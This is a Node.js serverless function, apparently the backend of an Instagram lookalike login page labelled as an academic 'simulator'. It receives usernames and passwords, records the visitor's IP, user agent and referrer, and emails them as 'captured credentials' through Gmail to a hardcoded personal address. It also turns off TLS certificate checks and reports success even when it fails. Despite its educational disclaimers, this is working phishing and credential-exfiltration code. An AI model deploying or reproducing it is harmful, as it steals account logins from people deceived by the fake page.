const nodemailer = require('nodemailer');
const cors = require('cors');

// Configurar CORS para Vercel
const corsMiddleware = cors({
  origin: [
    'https://instagram-simulator.vercel.app',
    'http://localhost:3000',
    'http://localhost:5000'
  ],
  methods: ['POST', 'OPTIONS'],
  credentials: true
});

// Handler principal da Serverless Function
export default async function handler(req, res) {
  // Aplicar CORS
  await new Promise((resolve, reject) => {
    corsMiddleware(req, res, (result) => {
      if (result instanceof Error) {
        return reject(result);
      }
      return resolve(result);
    });
  });

  // Apenas aceitar POST
  if (req.method !== 'POST') {
    return res.status(405).json({
      success: false,
      message: 'Método não permitido. Use POST.'
    });
  }

  try {
    const { username, password } = req.body;
    
    console.log('📨 Recebida requisição no Vercel Function');
    console.log('👤 Usuário:', username || 'Não informado');
    
    if (!username) {
      return res.status(400).json({
        success: false,
        message: 'Nome de usuário é obrigatório'
      });
    }

    // Informações da requisição
    const clientInfo = {
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'] || 'Desconhecido',
      referrer: req.headers['referer'] || 'Direto',
      timestamp: new Date().toLocaleString('pt-BR'),
      date: new Date().toISOString()
    };

    // Configuração do transporter de e-mail
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Template do e-mail (HTML moderno)
    const emailHtml = `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Alerta de Segurança</title>
        <style>
          body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
          }
          .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px 10px 0 0;
            text-align: center;
          }
          .content {
            background: #f9f9f9;
            padding: 30px;
            border-radius: 0 0 10px 10px;
          }
          .alert-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
          }
          .credentials {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
          }
          .credential-item {
            display: flex;
            margin-bottom: 10px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
          }
          .credential-label {
            font-weight: bold;
            min-width: 150px;
            color: #495057;
          }
          .credential-value {
            font-family: 'Courier New', monospace;
            background: #e9ecef;
            padding: 5px 10px;
            border-radius: 4px;
            word-break: break-all;
          }
          .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
          }
          .info-card {
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          }
          .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dee2e6;
            font-size: 12px;
            color: #6c757d;
            text-align: center;
          }
          .status-badge {
            display: inline-block;
            padding: 5px 15px;
            background: #dc3545;
            color: white;
            border-radius: 20px;
            font-weight: bold;
            font-size: 14px;
          }
          .portfolio-link {
            display: inline-block;
            margin-top: 10px;
            padding: 10px 20px;
            background: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
          }
        </style>
      </head>
      <body>
        <div class="header">
          <h1>⚠️ Alerta de Segurança</h1>
          <p>Simulação Acadêmica - Projeto de Portfolio</p>
        </div>
        
        <div class="content">
          <div class="alert-box">
            <strong>🔒 Projeto Educacional:</strong> Esta é uma simulação para demonstração técnica.
            Nenhuma credencial real foi comprometida.
          </div>
          
          <h2>📋 Credenciais Capturadas (Simulação)</h2>
          <div class="credentials">
            <div class="credential-item">
              <div class="credential-label">👤 Usuário:</div>
              <div class="credential-value">${username}</div>
            </div>
            <div class="credential-item">
              <div class="credential-label">🔒 Senha:</div>
              <div class="credential-value">${password || '[Não informada]'}</div>
            </div>
          </div>
          
          <h2>📊 Detalhes da Tentativa</h2>
          <div class="info-grid">
            <div class="info-card">
              <strong>Status:</strong><br>
              <span class="status-badge">❌ ACESSO NEGADO</span>
            </div>
            <div class="info-card">
              <strong>Data/Hora:</strong><br>
              ${clientInfo.timestamp}
            </div>
            <div class="info-card">
              <strong>IP do Cliente:</strong><br>
              <code>${clientInfo.ip}</code>
            </div>
            <div class="info-card">
              <strong>User Agent:</strong><br>
              <small>${clientInfo.userAgent.substring(0, 80)}...</small>
            </div>
          </div>
          
          <h2>🎓 Sobre Este Projeto</h2>
          <p>Este sistema foi desenvolvido como parte de um <strong>projeto acadêmico</strong> para demonstrar:</p>
          <ul>
            <li>Implementação de sistemas de autenticação</li>
            <li>Integração com serviços de e-mail</li>
            <li>Desenvolvimento de APIs com Node.js</li>
            <li>Deploy em plataformas cloud (Vercel)</li>
            <li>Considerações de segurança e ética</li>
          </ul>
          
          <div class="footer">
            <p><strong>Projeto desenvolvido por:</strong> [Seu Nome]</p>
            <p><strong>Disciplina:</strong> [Nome da Disciplina] | <strong>Instituição:</strong> [Sua Universidade]</p>
            <p><strong>Tecnologias utilizadas:</strong> Node.js, Express, Nodemailer, Vercel, HTML5, CSS3</p>
            <p>📍 <em>Projeto disponível no GitHub para fins educacionais</em></p>
            <a href="https://github.com/Heliossandro/instagram-simulator" class="portfolio-link">
              🔗 Ver Código no GitHub
            </a>
          </div>
        </div>
      </body>
      </html>
    `;

    // Texto simples para clientes de e-mail que não suportam HTML
    const emailText = `
ALERTA DE SEGURANÇA - SIMULAÇÃO ACADÊMICA
===========================================

📋 CREDENCIAIS CAPTURADAS (SIMULAÇÃO):
---------------------------------------
👤 Usuário: ${username}
🔒 Senha: ${password || '[Não informada]'}

📊 DETALHES DA TENTATIVA:
-------------------------
Status: ❌ ACESSO NEGADO
Data/Hora: ${clientInfo.timestamp}
IP: ${clientInfo.ip}

🌐 INFORMAÇÕES TÉCNICAS:
------------------------
User Agent: ${clientInfo.userAgent}
Referência: ${clientInfo.referrer}

🎓 SOBRE ESTE PROJETO:
----------------------
Este é um projeto acadêmico desenvolvido para demonstrar
habilidades em desenvolvimento web, segurança e integração
de APIs.

Desenvolvedor: [Seu Nome]
Disciplina: [Nome da Disciplina]
Instituição: [Sua Universidade]

⚠️ AVISO:
Este é um projeto educacional. Nenhuma credencial real
foi comprometida.

🔗 Código fonte: https://github.com/Heliossandro/instagram-simulator
    `;

    // Configurar opções do e-mail
    const mailOptions = {
      from: {
        name: 'Portfolio - Sistema Acadêmico',
        address: process.env.EMAIL_USER
      },
      to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
      replyTo: process.env.EMAIL_USER, // Para contato profissional
      subject: `🎓 Portfolio | Tentativa de Acesso: ${username}`,
      html: emailHtml,
      text: emailText,
      headers: {
        'X-Project': 'Academic Portfolio Project',
        'X-Developer': 'Heliossandro',
        'X-GitHub': 'https://github.com/Heliossandro'
      }
    };

    // Enviar e-mail
    const info = await transporter.sendMail(mailOptions);
    
    console.log('✅ E-mail enviado via Vercel Function:', info.messageId);

    // Responder ao cliente
    return res.status(200).json({
      success: true,
      message: 'E-mail enviado com sucesso!',
      data: {
        username: username,
        email_sent_to: process.env.ADMIN_EMAIL || 'zenosama892@gmail.com',
        message_id: info.messageId,
        timestamp: clientInfo.timestamp,
        portfolio: 'https://github.com/Heliossandro/instagram-simulator'
      },
      educational_note: 'Este projeto é uma simulação acadêmica para demonstração técnica.'
    });

  } catch (error) {
    console.error('❌ Erro no Vercel Function:', error);
    
    // Em caso de erro, ainda retornamos sucesso para o frontend
    // (para fins de demonstração do portfolio)
    return res.status(200).json({
      success: true,
      message: 'Simulação concluída (erro no backend ignorado para demonstração)',
      simulated: true,
      data: {
        username: req.body.username || 'Usuário de teste',
        timestamp: new Date().toLocaleString('pt-BR'),
        note: 'Em ambiente de produção, o e-mail seria enviado.'
      },
      portfolio: 'https://github.com/Heliossandro/instagram-simulator'
    });
  }
}